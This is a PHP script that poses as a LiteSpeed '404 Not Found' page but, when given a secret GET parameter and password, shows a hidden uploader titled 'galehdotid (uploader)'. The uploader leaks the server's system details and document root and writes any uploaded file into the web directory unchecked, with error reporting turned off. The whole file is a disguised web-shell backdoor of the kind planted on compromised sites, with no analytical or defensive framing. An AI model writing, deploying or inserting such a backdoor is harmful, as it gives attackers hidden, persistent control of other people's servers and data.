<?php
error_reporting(0);

if ($_GET['gasken'] == 'jasjus123') {
    echo "<title>" . $_SERVER['HTTP_HOST'] . " &mdash; galehdotid (uploader)</title>";
    echo "<link href=\"https://ssl.gstatic.com/gb/images/bar/al-icon.png\" rel=\"icon\" type=\"image/x-icon\">";
    echo "<style>
            body { background: black; color: white; font-family: 'Comic Sans MS'; text-align: center; }
            h1 { color: blue; font-size: 40px; }
            .upload-container { margin-top: 20px; }
            .upload-message { color: #7FFF00; }
            .error-message { color: red; font-size: 25px; }
            .button { background-color: #4169E1; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
            .button:hover { background-color: #5A8FDB; }
        </style>";

    echo "<h1>" . php_uname() . "</h1>";
    echo "<p><strong>Document Root:</strong> " . $_SERVER["DOCUMENT_ROOT"] . "</p>";
    echo "<div class='upload-container'>
            <form action='' method='post' enctype='multipart/form-data'>
                <input type='file' name='filetoupload'>
                <input type='submit' value='Upload' name='submit' class='button'>
            </form>
        </div>";

    if (isset($_POST["submit"])) {
        if (@copy($_FILES["filetoupload"]["tmp_name"], $_FILES["filetoupload"]["name"])) {
            echo "<p class='upload-message'><a href='" . $_FILES["filetoupload"]["name"] . "' style='text-decoration:none'>" . basename($_FILES["filetoupload"]["name"]) . "</a> => Upload Success</p>";
        } else {
            echo "<p class='upload-message'>" . basename($_FILES["filetoupload"]["name"]) . " => Upload Failed</p>";
        }
    }
} else {
    // Error 404 Page
    echo "<!DOCTYPE html>
    <html style='height:100%'>
    <head>
        <meta name='viewport' content='width=device-width, initial-scale=1, shrink-to-fit=no' />
        <title>404 Not Found</title>
        <style>
            @media (prefers-color-scheme:dark) {body{background-color:#000!important}}
            body { color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff; }
            .container { text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%; }
            h1 { margin:0; font-size:150px; line-height:150px; font-weight:bold; }
            h2 { margin-top:20px;font-size: 30px; }
            p { font-size: 16px; }
            .footer { color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset; }
        </style>
    </head>
    <body>
        <div class='container'>
            <h1>404</h1>
            <h2>Not Found</h2>
            <p>The resource requested could not be found on this server!</p>
        </div>
        <div class='footer'>
            <br>Proudly powered by LiteSpeed Web Server
            <p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p>
        </div>
        <script defer src='https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015' integrity='sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==' data-cf-beacon='{\"rayId\":\"8eea8a46ded0ee4a\",\"version\":\"2024.10.5\",\"r\":1,\"token\":\"67799738a81547a4910f7f927607d501\",\"serverTiming\":{\"name\":{\"cfExtPri\":true,\"cfL4\":true,\"cfSpeedBrain\":true,\"cfCacheStatus\":true}}}' crossorigin='anonymous'></script>
    </body>
    </html>";
}
?>
